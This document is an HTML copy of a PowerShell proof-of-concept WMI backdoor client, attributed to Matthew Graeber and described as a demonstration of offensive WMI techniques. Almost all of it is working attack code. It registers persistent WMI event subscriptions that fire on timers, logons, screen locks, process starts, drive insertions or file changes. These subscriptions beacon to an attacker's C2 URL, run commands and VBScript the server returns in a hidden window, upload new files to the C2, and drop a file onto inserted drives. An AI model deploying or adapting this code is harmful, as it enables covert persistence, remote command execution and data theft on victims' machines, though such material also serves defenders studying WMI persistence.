<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>WMI_Backdoor_Client.ps1</title>
</head><body>#https://github.com/mattifestation/WMI_Backdoor/blob/master/WMIBackdoor.ps1<br/>
#<b>THIS DOESN&quot;T INCLUDE THE SERVER PORTION</b><br/>
&lt;#<br/>
PoC WMI backdoor. This is a crude WMI backdoor (that doesn't include<br/>
a C2 server component) used for demonstration purposes only and to<br/>
demonstrate offensive WMI techniques. No further weaponization will<br/>
be performed. I will not respond to issues or pull requests.<br/>
<br/>
Author: Matthew Graeber (@mattifestation)<br/>
License: BSD 3-Clause<br/>
#&gt;<br/>
<br/>
Function New-WMIBackdoorTrigger {<br/>
  Param (<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'Interval')]<br/>
    [UInt32]<br/>
    $TimingInterval,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'AbsoluteDatetime')]<br/>
    [DateTime]<br/>
    $Datetime,<br/>
<br/>
    [Parameter(ParameterSetName = 'Interval')]<br/>
    [Parameter(ParameterSetName = 'AbsoluteDatetime')]<br/>
    [ValidateNotNullOrEmpty()]<br/>
    [String]<br/>
    $TimerName = 'Timer',<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'ProcessStart')]<br/>
    [ValidateNotNullOrEmpty()]<br/>
    [String]<br/>
    $ProcessName,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'NewOrModifiedFile')]<br/>
    [ValidateScript({ foreach ($Ext in $_) {(!$Ext.Contains('.')) -and ($Ext.Length)} })]<br/>
    [String[]]<br/>
    $NewOrModifiedFileExtensions,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'LockedScreen')]<br/>
    [Switch]<br/>
    $LockedScreen,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'InteractiveLogon')]<br/>
    [Switch]<br/>
    $InteractiveLogon,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'DriveInsertion')]<br/>
    [Switch]<br/>
    $DriveInsertion,<br/>
<br/>
    [ValidateNotNullOrEmpty()]<br/>
    [String]<br/>
    $TriggerName<br/>
  )<br/>
<br/>
  switch ($PsCmdlet.ParameterSetName) {<br/>
    'Interval' {<br/>
      if ($TriggerName) {<br/>
        $Name = $TriggerName<br/>
      } else {<br/>
        $Name = 'TimingIntervalTrigger'<br/>
      }<br/>
<br/>
      # Convert minutes to milliseconds<br/>
      $IntervalMS = $TimingInterval * 60000<br/>
<br/>
      $Result = @{<br/>
        Name = $Name<br/>
        EventNameSpace = 'ROOT\cimv2'<br/>
        QueryLanguage = 'WQL'<br/>
        Query = &quot;SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'&quot;<br/>
      }<br/>
<br/>
      # Use $TimerName and $IntervalMS as out of band information to be used by Register-WMIBackdoor<br/>
      # This is kind of ugly but I wanted to maintain strict function separation for event triggers,<br/>
      # payloads, and registration.<br/>
      $Result.PSObject.TypeNames.Insert(0, &quot;WMI.BackdoorTrigger.TimingInterval.$TimerName.$IntervalMS&quot;)<br/>
      return $Result<br/>
    }<br/>
<br/>
    'AbsoluteDatetime' {<br/>
      if ($TriggerName) {<br/>
        $Name = $TriggerName<br/>
      } else {<br/>
        $Name = 'DatetimeTrigger'<br/>
      }<br/>
<br/>
      $DMTFTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime($Datetime).Replace('.','_')<br/>
<br/>
      $Result = @{<br/>
        Name = $Name<br/>
        EventNameSpace = 'ROOT\cimv2'<br/>
        QueryLanguage = 'WQL'<br/>
        Query = &quot;SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'&quot;<br/>
      }<br/>
<br/>
      $Result.PSObject.TypeNames.Insert(0, &quot;WMI.BackdoorTrigger.DateTime.$TimerName.$DMTFTime&quot;)<br/>
      return $Result<br/>
    }<br/>
<br/>
    'ProcessStart' {<br/>
      if ($TriggerName) {<br/>
        $Name = $TriggerName<br/>
      } else {<br/>
        $Name = 'ProcessStartTrigger'<br/>
      }<br/>
<br/>
      $Result = @{<br/>
        Name = $Name<br/>
        EventNameSpace = 'ROOT\cimv2'<br/>
        QueryLanguage = 'WQL'<br/>
        Query = &quot;SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = '$ProcessName'&quot;<br/>
      }<br/>
<br/>
      $Result.PSObject.TypeNames.Insert(0, &quot;WMI.BackdoorTrigger.ProcessStart&quot;)<br/>
      return $Result<br/>
    }<br/>
<br/>
    'LockedScreen' {<br/>
      if ($TriggerName) {<br/>
        $Name = $TriggerName<br/>
      } else {<br/>
        $Name = 'LockedScreenTrigger'<br/>
      }<br/>
<br/>
      $Result = @{<br/>
        Name = $Name<br/>
        EventNameSpace = 'ROOT\cimv2'<br/>
        QueryLanguage = 'WQL'<br/>
        Query = 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = &quot;LogonUI.exe&quot;'<br/>
      }<br/>
<br/>
      $Result.PSObject.TypeNames.Insert(0, &quot;WMI.BackdoorTrigger.LockedScreen&quot;)<br/>
      return $Result<br/>
    }<br/>
<br/>
    'InteractiveLogon' {<br/>
      if ($TriggerName) {<br/>
        $Name = $TriggerName<br/>
      } else {<br/>
        $Name = 'InteractiveLogonTrigger'<br/>
      }<br/>
<br/>
      $Result = @{<br/>
        Name = $Name<br/>
        EventNameSpace = 'ROOT\subscription'<br/>
        QueryLanguage = 'WQL'<br/>
        Query = &quot;SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2&quot;<br/>
      }<br/>
<br/>
      $Result.PSObject.TypeNames.Insert(0, &quot;WMI.BackdoorTrigger.InteractiveLogon&quot;)<br/>
      return $Result<br/>
    }<br/>
<br/>
    'DriveInsertion' {<br/>
      if ($TriggerName) {<br/>
        $Name = $TriggerName<br/>
      } else {<br/>
        $Name = 'DriveInsertionTrigger'<br/>
      }<br/>
<br/>
      $Result = @{<br/>
        Name = $Name<br/>
        EventNameSpace = 'ROOT\cimv2'<br/>
        QueryLanguage = 'WQL'<br/>
        Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2'<br/>
      }<br/>
<br/>
      $Result.PSObject.TypeNames.Insert(0, &quot;WMI.BackdoorTrigger.DriveInsertion&quot;)<br/>
      return $Result<br/>
    }<br/>
<br/>
    'NewOrModifiedFile' {<br/>
      if ($TriggerName) {<br/>
        $Name = $TriggerName<br/>
      } else {<br/>
        $Name = 'NewOrModifiedFileTrigger'<br/>
      }<br/>
<br/>
      $QueryExtensions = ($NewOrModifiedFileExtensions | % { &quot;TargetInstance.Extension = `&quot;$_`&quot;&quot; }) -join ' OR '<br/>
<br/>
      $Result = @{<br/>
        Name = $Name<br/>
        EventNameSpace = 'ROOT\cimv2'<br/>
        QueryLanguage = 'WQL'<br/>
        Query = &quot;SELECT * FROM __InstanceOperationEvent WITHIN 30 WHERE ((__CLASS = `&quot;__InstanceCreationEvent`&quot; OR __CLASS = `&quot;__InstanceModificationEvent`&quot;) AND TargetInstance ISA `&quot;CIM_DataFile`&quot;) AND ($QueryExtensions)&quot;<br/>
      }<br/>
<br/>
      $Result.PSObject.TypeNames.Insert(0, &quot;WMI.BackdoorTrigger.NewOrModifiedFile&quot;)<br/>
      return $Result<br/>
    }<br/>
  }<br/>
}<br/>
<br/>
Function New-WMIBackdoorAction {<br/>
  Param (<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')]<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')]<br/>
    [Uri]<br/>
    $C2Uri,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')]<br/>
    [Switch]<br/>
    $Backdoor,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'KillProcess')]<br/>
    [Switch]<br/>
    $KillProcess,<br/>
<br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'InfectDrive')]<br/>
    [Switch]<br/>
    $InfectDrive,<br/>
    <br/>
    [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')]<br/>
    [Switch]<br/>
    $FileUpload,<br/>
<br/>
    [ValidateNotNullOrEmpty()]<br/>
    [String]<br/>
    $ActionName<br/>
  )<br/>
<br/>
  $Base64Decoder = @'<br/>
    ' Decodes a base-64 encoded string (BSTR type).<br/>
    ' 1999 - 2004 Antonin Foller, http://www.motobit.com<br/>
    ' 1.01 - solves problem with Access And 'Compare Database' (InStr)<br/>
    Function Base64Decode(ByVal base64String)<br/>
      'rfc1521<br/>
      '1999 Antonin Foller, Motobit Software, http://Motobit.cz<br/>
      Const Base64 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;<br/>
      Dim dataLength, sOut, groupBegin<br/>
 <br/>
      'remove white spaces, If any<br/>
      base64String = Replace(base64String, vbCrLf, &quot;&quot;)<br/>
      base64String = Replace(base64String, vbTab, &quot;&quot;)<br/>
      base64String = Replace(base64String, &quot; &quot;, &quot;&quot;)<br/>
 <br/>
      'The source must consists from groups with Len of 4 chars<br/>
      dataLength = Len(base64String)<br/>
      If dataLength Mod 4 &lt;&gt; 0 Then<br/>
      Err.Raise 1, &quot;Base64Decode&quot;, &quot;Bad Base64 string.&quot;<br/>
      Exit Function<br/>
      End If<br/>
<br/>
 <br/>
      ' Now decode each group:<br/>
      For groupBegin = 1 To dataLength Step 4<br/>
      Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut<br/>
      ' Each data group encodes up To 3 actual bytes.<br/>
      numDataBytes = 3<br/>
      nGroup = 0<br/>
<br/>
      For CharCounter = 0 To 3<br/>
        ' Convert each character into 6 bits of data, And add it To<br/>
        ' an integer For temporary storage. If a character is a '=', there<br/>
        ' is one fewer data byte. (There can only be a maximum of 2 '=' In<br/>
        ' the whole string.)<br/>
<br/>
        thisChar = Mid(base64String, groupBegin + CharCounter, 1)<br/>
<br/>
        If thisChar = &quot;=&quot; Then<br/>
        numDataBytes = numDataBytes - 1<br/>
        thisData = 0<br/>
        Else<br/>
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1<br/>
        End If<br/>
        If thisData = -1 Then<br/>
        Err.Raise 2, &quot;Base64Decode&quot;, &quot;Bad character In Base64 string.&quot;<br/>
        Exit Function<br/>
        End If<br/>
<br/>
        nGroup = 64 * nGroup + thisData<br/>
      Next<br/>
  <br/>
      'Hex splits the long To 6 groups with 4 bits<br/>
      nGroup = Hex(nGroup)<br/>
  <br/>
      'Add leading zeros<br/>
      nGroup = String(6 - Len(nGroup), &quot;0&quot;) &amp; nGroup<br/>
  <br/>
      'Convert the 3 byte hex integer (6 chars) To 3 characters<br/>
      pOut = Chr(CByte(&quot;&amp;H&quot; &amp; Mid(nGroup, 1, 2))) + _<br/>
        Chr(CByte(&quot;&amp;H&quot; &amp; Mid(nGroup, 3, 2))) + _<br/>
        Chr(CByte(&quot;&amp;H&quot; &amp; Mid(nGroup, 5, 2)))<br/>
  <br/>
      'add numDataBytes characters To out string<br/>
      sOut = sOut &amp; Left(pOut, numDataBytes)<br/>
      Next<br/>
<br/>
      Base64Decode = sOut<br/>
    End Function<br/>
'@<br/>
<br/>
  switch ($PsCmdlet.ParameterSetName) {<br/>
    'Backdoor' {<br/>
      $VBScript = @&quot;<br/>
        Option Explicit<br/>
        On Error Resume Next<br/>
<br/>
        Dim oXMLHTTP, oReg, aC2URL, aCmdType, aClassName, aPropertyName, aPayload, aMachineGuid<br/>
<br/>
        Set oReg = GetObject(&quot;winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv&quot;)<br/>
        oReg.GetStringValue &amp;H80000002, &quot;SOFTWARE\Microsoft\Cryptography&quot;, &quot;MachineGuid&quot;, aMachineGuid<br/>
<br/>
        aC2URL = &quot;$($C2Uri.AbsoluteUri)index.html&amp;ID=&quot; &amp; aMachineGuid<br/>
<br/>
        Sub StorePayloadInWMIRepo(classname, propertyname, payload)<br/>
	        Dim oLocation, oServices, oDataObject<br/>
	<br/>
	        Set oLocation = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)<br/>
	        Set oServices = oLocation.ConnectServer(, &quot;root\cimv2&quot;)<br/>
	<br/>
	        Set oDataObject = oServices.Get<br/>
	        oDataObject.Path_.Class = classname<br/>
	        oDataObject.Properties_.Add(propertyname, 8).Value = payload<br/>
	        oDataObject.Put_<br/>
        End Sub<br/>
<br/>
        Sub DeleteWMIClass(classname, propertyname)<br/>
          Dim oLocation, oServices, oDataObject<br/>
<br/>
          Set oLocation = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)<br/>
          Set oServices = oLocation.ConnectServer(, &quot;root\cimv2&quot;)<br/>
	<br/>
          Set oDataObject = oServices.Get<br/>
          oDataObject.Path_.Class = classname<br/>
          oDataObject.Properties_.Add(propertyname, 8).Value = &quot;&quot;<br/>
          oDataObject.Delete_()<br/>
        End Sub<br/>
<br/>
        Sub ExecCommand(command)<br/>
	        Dim oLocation, oServices, oProcess, oStartup, oConfig, oResult, iProcessID<br/>
<br/>
	        Const HIDDEN_WINDOW = 12<br/>
	        Set oLocation = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)<br/>
	        Set oServices = oLocation.ConnectServer(, &quot;root\cimv2&quot;)<br/>
	        Set oStartup = oServices.Get(&quot;Win32_ProcessStartup&quot;)<br/>
	        Set oConfig = oStartup.SpawnInstance_<br/>
	        oConfig.ShowWindow = HIDDEN_WINDOW<br/>
	        Set oProcess = GetObject(&quot;winmgmts:root\cimv2:Win32_Process&quot;)<br/>
	        oResult = oProcess.Create(command, null, oConfig, iProcessID)<br/>
        End Sub<br/>
<br/>
        $Base64Decoder<br/>
<br/>
        Set oXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)<br/>
        oXMLHTTP.open &quot;GET&quot;, aC2URL, False<br/>
        oXMLHTTP.send()<br/>
<br/>
        If oXMLHTTP.Status = 200 Then<br/>
	        aCmdType = oXMLHTTP.getResponseHeader(&quot;Type&quot;)<br/>
	        aClassName = oXMLHTTP.getResponseHeader(&quot;Class&quot;)<br/>
	        aPropertyName = oXMLHTTP.getResponseHeader(&quot;Property&quot;)<br/>
	        aPayload = Base64Decode(oXMLHTTP.responseText)<br/>
	<br/>
	        Select Case aCmdType<br/>
		        Case &quot;V&quot;<br/>
			        If Not IsNull(aPayload) Then<br/>
				        Execute aPayload<br/>
			        End If<br/>
		        Case &quot;P&quot;<br/>
			        If Not IsNull(aClassName) And Not IsNull(aPropertyName) And Not IsNull(aPayload) Then<br/>
				        Call StorePayloadInWMIRepo(aClassName, aPropertyName, aPayload)<br/>
			        End If<br/>
            Case &quot;D&quot;<br/>
              If Not IsNull(aClassName) And Not IsNull(aPropertyName) Then<br/>
				        Call DeleteWMIClass(aClassName, aPropertyName)<br/>
			        End If<br/>
		        Case &quot;C&quot;<br/>
			        If Not IsNull(aPayload) Then<br/>
				        Call ExecCommand(aPayload)<br/>
			        End If<br/>
	        End Select<br/>
        End If<br/>
<br/>
&quot;@<br/>
<br/>
      if ($ActionName) {<br/>
        $Name = $ActionName<br/>
      } else {<br/>
        $Name = 'LaunchBeaconingBackdoor'<br/>
      }<br/>
    }<br/>
<br/>
    'KillProcess' {<br/>
      $VBScript = @&quot;<br/>
        Dim oLocation, oServices, oProcessList, oProcess<br/>
<br/>
	      Set oLocation = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)<br/>
	      Set oServices = oLocation.ConnectServer(, &quot;root\cimv2&quot;)<br/>
	      Set oProcessList = oServices.ExecQuery(&quot;SELECT * FROM Win32_Process WHERE ProcessID = &quot; &amp; TargetEvent.ProcessID)<br/>
	      For Each oProcess in oProcessList<br/>
		      oProcess.Terminate()<br/>
	      Next<br/>
&quot;@<br/>
<br/>
      if ($ActionName) {<br/>
        $Name = $ActionName<br/>
      } else {<br/>
        $Name = 'KillProcess'<br/>
      }<br/>
    }<br/>
<br/>
    'InfectDrive' {<br/>
      # This is only a PoC at this stage. This payload simply drops<br/>
      # the EICAR signature to &lt;INSERTED_DRIVE_LETTER&gt;:\eicar.txt<br/>
<br/>
      $VBScript = @&quot;<br/>
        Dim oFSO, oFile, sFilePath, sDecodedEicar<br/>
<br/>
        $Base64Decoder<br/>
<br/>
        sDecodedEicar = Base64Decode(&quot;WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=&quot;)<br/>
<br/>
        Set oFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br/>
<br/>
        sFilePath = TargetEvent.DriveName &amp; &quot;\eicar.txt&quot;<br/>
        Set oFile = oFSO.CreateTextFile(sFilePath, True)<br/>
        oFile.Write sDecodedEicar<br/>
        oFile.Close<br/>
&quot;@<br/>
<br/>
      if ($ActionName) {<br/>
        $Name = $ActionName<br/>
      } else {<br/>
        $Name = 'DriveInfector'<br/>
      }<br/>
    }<br/>
<br/>
    'FileUpload' {<br/>
      $VBScript = @&quot;<br/>
        On Error Resume Next<br/>
<br/>
        Dim oReg, oXMLHTTP, oStream, aMachineGuid, aC2URL, vBinary<br/>
<br/>
        Set oReg = GetObject(&quot;winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv&quot;)<br/>
        oReg.GetStringValue &amp;H80000002, &quot;SOFTWARE\Microsoft\Cryptography&quot;, &quot;MachineGuid&quot;, aMachineGuid<br/>
<br/>
        aC2URL = &quot;$($C2Uri.AbsoluteUri)index.html&amp;ID=&quot; &amp; aMachineGuid<br/>
<br/>
        Set oStream = CreateObject(&quot;ADODB.Stream&quot;)<br/>
        oStream.Type = 1<br/>
        oStream.Open<br/>
        oStream.LoadFromFile TargetEvent.TargetInstance.Name<br/>
        vBinary = oStream.Read<br/>
<br/>
        Set oXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)<br/>
        oXMLHTTP.open &quot;POST&quot;, aC2URL, False<br/>
        oXMLHTTP.setRequestHeader &quot;Path&quot;, TargetEvent.TargetInstance.Name<br/>
        oXMLHTTP.send(vBinary)<br/>
&quot;@<br/>
<br/>
      if ($ActionName) {<br/>
        $Name = $ActionName<br/>
      } else {<br/>
        $Name = 'FileUpload'<br/>
      }<br/>
    }<br/>
  }<br/>
<br/>
  $Action = @{<br/>
    Name = $Name<br/>
    ScriptingEngine = 'VBScript'<br/>
    ScriptText = $VBScript<br/>
    KillTimeout = [UInt32] 45<br/>
  }<br/>
<br/>
  $Action.PSObject.TypeNames.Insert(0, 'WMI.BackdoorAction')<br/>
  return $Action<br/>
}<br/>
<br/>
Function Register-WMIBackdoor {<br/>
  Param (<br/>
    [Parameter(Mandatory = $True)]<br/>
    [ValidateScript({$_.PSObject.TypeNames[0].StartsWith('WMI.BackdoorTrigger')})]<br/>
    [Hashtable]<br/>
    $Trigger,<br/>
<br/>
    [Parameter(Mandatory = $True)]<br/>
    [ValidateScript({$_.PSObject.TypeNames[0] -eq 'WMI.BackdoorAction'})]<br/>
    [Hashtable]<br/>
    $Action,<br/>
<br/>
    [String]<br/>
    [ValidateNotNullOrEmpty()]<br/>
    [Alias('Cn')]<br/>
    $ComputerName = '.',<br/>
<br/>
    [Management.Automation.PSCredential]<br/>
    $Credential<br/>
  )<br/>
<br/>
  $TypeComponents = $Trigger.PSObject.TypeNames[0].Split('.')<br/>
  <br/>
  # Register the timer components if a time-based trigger was selected<br/>
  switch ($TypeComponents[2]) {<br/>
    'TimingInterval' {<br/>
      $TimerName = $TypeComponents[3]<br/>
      $TimingInterval = $TypeComponents[4]<br/>
<br/>
      $TimerArg = @{<br/>
        IntervalBetweenEvents = ([UInt32] $TimingInterval)<br/>
        SkipIfPassed = $False<br/>
        TimerId = $TimerName<br/>
      }<br/>
<br/>
      $Arguments = @{<br/>
        Namespace = 'ROOT\cimv2'<br/>
        Class = '__IntervalTimerInstruction'<br/>
        ComputerName = $ComputerName<br/>
        Arguments = $TimerArg<br/>
        ErrorAction = 'Stop'<br/>
      }<br/>
<br/>
      if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
      $Timer = Set-WmiInstance @Arguments<br/>
    }<br/>
<br/>
    'DateTime' {<br/>
      $TimerName = $TypeComponents[3]<br/>
      $DateTime = $TypeComponents[3].Replace('_', '.')<br/>
<br/>
      $TimerArg = @{<br/>
        EventDateTime = $DateTime<br/>
        SkipIfPassed = $False<br/>
        TimerId = $TimerName<br/>
      }<br/>
<br/>
      $Arguments = @{<br/>
        Namespace = 'ROOT\cimv2'<br/>
        Class = '__AbsoluteTimerInstruction'<br/>
        ComputerName = $ComputerName<br/>
        Arguments = $TimerArg<br/>
        ErrorAction = 'Stop'<br/>
      }<br/>
<br/>
      if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
      $Timer = Set-WmiInstance @Arguments<br/>
    }<br/>
  }<br/>
<br/>
  $FilterParams = @{<br/>
    Namespace = 'root\subscription'<br/>
    Class = '__EventFilter'<br/>
    ComputerName = $ComputerName<br/>
    Arguments = $Trigger<br/>
    ErrorAction = 'Stop'<br/>
  }<br/>
<br/>
  if ($PSBoundParameters['Credential']) { $FilterParams['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
  $Filter = Set-WmiInstance @FilterParams<br/>
<br/>
  $ConsumerParams = @{<br/>
    Namespace = 'root\subscription'<br/>
    Class = 'ActiveScriptEventConsumer'<br/>
    ComputerName = $ComputerName<br/>
    Arguments = $Action<br/>
    ErrorAction = 'Stop'<br/>
  }<br/>
<br/>
  if ($PSBoundParameters['Credential']) { $ConsumerParams['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
  $Consumer = Set-WmiInstance @ConsumerParams<br/>
<br/>
  $BindingParams = @{<br/>
    Namespace = 'root\subscription'<br/>
    Class = '__FilterToConsumerBinding'<br/>
    ComputerName = $ComputerName<br/>
    Arguments = @{ Filter = $Filter; Consumer = $Consumer }<br/>
    ErrorAction = 'Stop'<br/>
  }<br/>
<br/>
  if ($PSBoundParameters['Credential']) { $BindingParams['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
  $FilterConsumerBinding = Set-WmiInstance @BindingParams<br/>
<br/>
  $Result = New-Object PSObject -Property @{<br/>
    Filter = $Filter<br/>
    Consumer = $Consumer<br/>
    Binding = $FilterConsumerBinding<br/>
  }<br/>
<br/>
  $Result.PSObject.TypeNames.Insert(0, 'WMI.BackdoorRegistration')<br/>
  return $Result<br/>
}</body></html>